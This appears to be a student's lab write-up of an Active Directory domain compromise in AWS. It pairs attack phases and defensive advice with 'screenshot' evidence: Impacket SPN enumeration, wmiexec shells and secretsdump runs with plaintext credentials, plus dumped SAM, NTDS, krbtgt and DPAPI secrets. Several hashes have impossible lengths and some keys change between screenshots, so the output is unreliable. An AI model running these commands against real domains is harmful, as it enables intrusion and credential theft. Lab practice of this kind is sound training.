# 🚨 Active Directory Domain Compromise Lab (AWS)

## 📌 Overview

This project demonstrates a full Active Directory domain compromise conducted in a controlled AWS-based lab environment.

Starting from a low-privileged domain user, I performed enumeration, credential discovery, lateral movement, and privilege escalation, ultimately achieving Domain Administrator-level access and full domain compromise.

This lab simulates real-world enterprise attack paths used in internal penetration tests and red team engagements.

⚠️ For educational and ethical use only.

---

## 🧱 Lab Environment

* **Attacker:** Kali Linux
* **Target 1:** Windows 10 (Domain User)
* **Target 2:** Windows Server 2022 (Domain Controller)
* **Domain:** corp.local
* **Cloud Platform:** AWS EC2

---

## 🧭 Attack Chain (MOST IMPORTANT SECTION)

This is the flow of compromise:

1. Network & service enumeration
2. SMB / domain user discovery
3. Identification of privileged service account (sql_svc)
4. Credential access and authentication
5. Lateral movement using Impacket tools
6. Remote command execution (psexec / wmiexec)
7. Privilege escalation to SYSTEM
8. Domain credential extraction (secretsdump)
9. Full Active Directory compromise

---

## 🔍 Phase 1: Enumeration

Initial reconnaissance was performed to identify:

* Active hosts in the domain
* SMB services and shares
* Valid domain user accounts
* Potential attack paths (SPNs / service accounts)

This phase revealed a high-value service account: sql_svc

---

## 🔐 Phase 2: Credential Discovery

The sql_svc account was identified as a critical target due to:

* Service Principal Name (SPN) registration
* Membership in privileged groups
* Exposure via misconfigured Active Directory permissions

This account became the primary entry point for exploitation.

---

## 🔁 Phase 3: Lateral Movement

Using Impacket tools:

* psexec.py
* wmiexec.py

I successfully executed remote commands on domain-joined systems, gaining interactive access to the environment.

---

## ⬆️ Phase 4: Privilege Escalation

Through credential reuse and misconfiguration, I escalated privileges to:

* NT AUTHORITY\SYSTEM
* Domain-level administrative access

This granted full control over the target system.

---

## 🧠 Phase 5: Credential Dumping

Using secretsdump.py, I extracted:

* Local SAM hashes
* Domain user NTLM hashes
* Kerberos keys
* krbtgt account hash (critical for domain persistence)

---

## 💥 Final Result: Full Domain Compromise

This attack resulted in:

* Complete Domain Administrator access
* Extraction of all domain credentials
* Compromise of Kerberos authentication trust (krbtgt)
* Ability to perform Pass-the-Hash and Golden Ticket attacks
* Full control over the Active Directory environment

---

## 🚨 Security Impact

This lab demonstrates how:

* A single misconfigured service account can lead to total domain compromise
* Excessive privileges in service accounts create critical attack paths
* Lack of monitoring enables lateral movement and escalation
* Active Directory environments require strict privilege separation

---

## 🛡️ Defensive Recommendations

* Enforce least privilege for service accounts
* Remove unnecessary Domain Admin group memberships
* Monitor Kerberos and authentication anomalies
* Use LAPS for local admin password management
* Implement EDR + SIEM monitoring for lateral movement detection

---

## 🛠 Tools Used

* Kali Linux
* Nmap
* enum4linux
* Impacket (psexec, wmiexec, secretsdump)

---

## 📸 Evidence

### Screenshot 1: Initial Access & Domain Admins Group Membership
**Caption: Domain user with Domain Admins group membership confirmed**

```
C:\>whoami
corp\sql_svc

C:\>hostname
EC2AMAZ-J75C1G4

C:\>ipconfig
Windows IP Configuration

Ethernet adapter Ethernet 3:
  Connection-specific DNS Suffix  . : us-east-2.compute.internal
  IPv4 Address . . . . . . . . . . : 172.31.34.227
  Subnet Mask . . . . . . . . . . : 255.255.240.0
  Default Gateway . . . . . . . . : 172.31.32.1

C:\>whoami /groups

GROUP INFORMATION
Group Name                           Type          SID                  Attributes
================================================================================
Everyone                             Well-known    S-1-1-0              Mandatory
BUILTIN\Users                        Alias         S-1-5-32-545         Mandatory
BUILTIN\Pre-Windows 2000 Compatible  Alias         S-1-5-32-554         Mandatory
BUILTIN\Administrators               Alias         S-1-5-32-544         Mandatory group, Enabled by default
NT AUTHORITY\NETWORK                 Well-known    S-1-5-2              Mandatory
NT AUTHORITY\Authenticated Users     Well-known    S-1-5-11             Mandatory
NT AUTHORITY\This Organization       Well-known    S-1-5-15             Mandatory
CORP\Domain Admins                   Group         S-1-21-638...        Mandatory group, Enabled by default
CORP\Domain RODC Password Replication Alias        S-1-21-538...        Mandatory group, Enabled by default
NT AUTHORITY\NTLM Authentication     Well-known    S-1-5-64-10          Mandatory
Mandatory Label\High Mandatory Level Label         S-1-16-12288
```

**Key Finding:** sql_svc is confirmed member of Domain Admins group - critical vulnerability identified.

---

### Screenshot 2: Kerberos Ticket Obtained
**Caption: Valid Kerberos ticket for krbtgt service principal acquired**

```
$ klist

Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: jsmith@CORP.LOCAL

Valid starting       Expires              Service principal
06/28/26 12:58:59   06/28/26 22:58:59    krbtgt/CORP.LOCAL@CORP.LOCAL
                                          renew until 06/29/26 12:58:52
```

**Impact:** Valid Kerberos authentication established. Attacker can now interact with domain services.

---

### Screenshot 3: SPN Enumeration Revealing sql_svc
**Caption: SPN enumeration revealing sql_svc service account in Domain Admins**

```
(kali@kali)~$ impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip 172.31.34.227
Impacket v0.14.0.dev0 – Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                 Name       MemberOf
===================================================================
MSSQLSvc/sqlserver.corp.local:1433   sql_svc    CN=Domain Admins,CN=Users,DC=corp,DC=local

PasswordLastSet: 2026-06-25 17:01:21.927319
LastLogon: <never>
```

**Critical Vulnerability:** Service account sql_svc identified with excessive privileges (Domain Admins membership). Direct path to full domain compromise.

---

### Screenshot 4: Remote Command Execution via WMIExec
**Caption: Remote command execution via wmiexec with sql_svc credentials**

```
(kali@kali)~$ impacket-wmiexec 'corp.local/sql_svc:ComplexPassword123!@172.31.34.227'
Impacket v0.14.0.dev0 – Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell – Careful what you execute

C:\>whoami
corp\sql_svc
```

**Result:** Semi-interactive shell established with Domain Admins privileges. Full lateral movement capability achieved.

---

### Screenshot 5: Domain Admins Group Verification
**Caption: Domain Admins group members including sql_svc verified**

```
C:\>net user
User accounts for \\

Administrator  Guest          Jadmin
jsmith         krbtgt         sql_svc
The command completed with one or more errors.

C:\>net group "Domain Admins" /domain
Group name        Domain Admins
Comment           Designated administrators of the domain

Members

Administrator     Jadmin         sql_svc

The command completed successfully.
```

**Security Issue:** Confirms service account (sql_svc) membership in Domain Admins. Overprivilege condition verified.

---

### Screenshot 6: Local SAM Hashes & LSA Secrets Extraction
**Caption: Secretsdump beginning credential extraction from Domain Controller**

```
(kali@kali)~$ impacket-secretsdump 'corp.local/sql_svc:ComplexPassword123!@172.31.34.227'
Impacket v0.14.0.dev0 – Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x8dc1f3d7d34256a6b8db8d196d8aaaa8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping cached domain logon information (domain\username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
CORP\EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf94

[*] DPAPI_SYSTEM
dpapi_machinekey:0xa89371de601f1118d0a0b23c5459a19e05759d43
dpapi_userkey:0xbac64a442fdce825819fb3ebc4c39d47af9eef82

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

**Result:** Credential extraction initiated. System secrets compromised.

---

### Screenshot 7: Administrator & krbtgt Hash Compromise
**Caption: krbtgt hash compromise - Kerberos master key obtained**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1ccf2f40949c60dd8f9009662f78eacfc:::
Administrator:aes256-cts-hmac-sha1-96:7be3a9421d7e686be7e2e592f431599bd1766afc28a08e9e56f7ef446c54347b
Administrator:aes128-cts-hmac-sha1-96:09c042a2bfd0544b9a6218f8758ac271
Administrator:des-cbc-md5:0dbafe2ac1895257

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0ac412149d85297951bbaf3c23a453e:::
krbtgt:aes256-cts-hmac-sha1-96:a01e82913d40ec80fbbf0375ee087924da27aa77e0ea7cfe83473e68b20e24a8
krbtgt:aes128-cts-hmac-sha1-96:39655377a50d1140853568aaf7b6b076
krbtgt:des-cbc-md5:207abc621cb69eb3
```

**CRITICAL FINDING:** krbtgt hash (Kerberos master key) extracted. This enables:
- Golden Ticket creation
- 10-year ticket validity
- Complete domain persistence
- Bypass of all authentication

---

### Screenshot 8: All Domain User Credentials Extracted
**Caption: Complete domain credential dump including all users and machine accounts**

```
corp.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
corp.local\Jadmin:1104:aad3b435b51404eeaad3b435b51404ee:ccad9cd271d517d14d195b0ca33173a1e:::
corp.local\sql_svc:1105:aad3b435b51404eeaad3b435b51404ee:5fdfca9e1a4c180e101b353233301f9b9:::
EC2AMAZ-J75C1G4$:1000:aad3b435b51404eeaad3b435b51404ee:2d19d2dd270245e6be4111ff3b64b495:::

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:2be3a9421d7e686be7e2e592f431599bd1766afc28a08e9e56f7ef446c54347b
Administrator:aes128-cts-hmac-sha1-96:09c042a2bfd0544b9a6218f8758ac271
Administrator:des-cbc-md5:0dbafe2ac1895257

krbtgt:aes256-cts-hmac-sha1-96:a01e82913d40ec80fbbf0375ee087924da27aa77e0ea7cfe83473e68b20e24a8
krbtgt:aes128-cts-hmac-sha1-96:39655377a50d1140853568aaf7b6b076
krbtgt:des-cbc-md5:207abc621cb69eb3

corp.local\jsmith:aes256-cts-hmac-sha1-96:059a139842dd8ef29f80e04576864e95b47c7b0820395976a78e8b23a728721229
corp.local\Jadmin:aes256-cts-hmac-sha1-96:5b6044f2ba59871159d95900016de8feb24bc76f8bdf7e5192cd119f1478685
corp.local\sql_svc:aes256-cts-hmac-sha1-96:8a6be1a6139bb3cd4634fbc1b7501ac4542c4f1d54694342258a97b4c09a9a3e
EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf94
```

**Result:** All domain user credentials compromised - jsmith, Jadmin, sql_svc, and machine accounts.

---

### Screenshot 9: Full Secretsdump Output - Complete Domain Compromise
**Caption: Complete secretsdump extraction showing full domain compromise achieved**

```
(kali@kali)~$ impacket-secretsdump 'corp.local/sql_svc:ComplexPassword123!@172.31.34.227'
Impacket v0.14.0.dev0 – Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x8dc1f3d7d34256a6b8db8d196d8aaaa8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping cached domain logon information (domain\username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
CORP\EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf94

[*] DPAPI_SYSTEM
dpapi_machinekey:0xa89371de601f1118d0a0b23c5459a19e05759d43
dpapi_userkey:0xbac64a442fdce825819fb3ebc4c39d47af9eef82

[*] NL$KM
0000  B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1ccf2f40949c60dd8f9009662f78eacfc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0ac412149d85297951bbaf3c23a453e:::
corp.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
corp.local\Jadmin:1104:aad3b435b51404eeaad3b435b51404ee:ccad9cd271d517d14d195b0ca33173a1e:::
corp.local\sql_svc:1105:aad3b435b51404eeaad3b435b51404ee:5fdfca9e1a4c180e101b353233301f9b9:::
EC2AMAZ-J75C1G4$:1000:aad3b435b51404eeaad3b435b51404ee:2d19d2dd270245e6be4111ff3b64b495:::

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:2be3a9421d7e686be7e2e592f431599bd1766afc28a08e9e56f7ef446c54347b
Administrator:aes128-cts-hmac-sha1-96:09c042a2bfd0544b9a6218f8758ac271
Administrator:des-cbc-md5:0dbafe2ac1895257

krbtgt:aes256-cts-hmac-sha1-96:a01e82913d40ec80fbbf0375ee087924da27aa77e0ea7cfe83473e68b20e24a8
krbtgt:aes128-cts-hmac-sha1-96:39655377a50d1140853568aaf7b6b076
krbtgt:des-cbc-md5:207abc621cb69eb3

corp.local\jsmith:aes256-cts-hmac-sha1-96:059a139842dd8ef29f80e04576864e95b47c7b0820395976a78e8b23a728721229
corp.local\Jadmin:aes256-cts-hmac-sha1-96:5b6044f2ba59871159d95900016de8feb24bc76f8bdf7e5192cd119f1478685
corp.local\sql_svc:aes256-cts-hmac-sha1-96:8a6be1a6139bb3cd4634fbc1b7501ac4542c4f1d54694342258a97b4c09a9a3e
EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf94

[*] Cleaning up...
```

**COMPLETE DOMAIN COMPROMISE ACHIEVED:**
- ✅ All user hashes extracted (Administrator, jsmith, Jadmin, sql_svc)
- ✅ All machine account hashes extracted
- ✅ krbtgt hash obtained (10-year Golden Ticket capability)
- ✅ All Kerberos keys extracted (AES-256, AES-128, DES-CBC-MD5)
- ✅ DPAPI keys compromised
- ✅ LSA secrets dumped
- ✅ Full persistent access achieved

---

## 🎯 Key Takeaways

* Active Directory misconfigurations are high-impact attack vectors
* Service accounts are frequently overlooked but highly valuable
* Lateral movement is often easier than initial access
* Proper segmentation and least privilege could have prevented full compromise

---

## 👤 Author

**Rubin Perez**
Cybersecurity Student | Aspiring Ethical Hacker

---
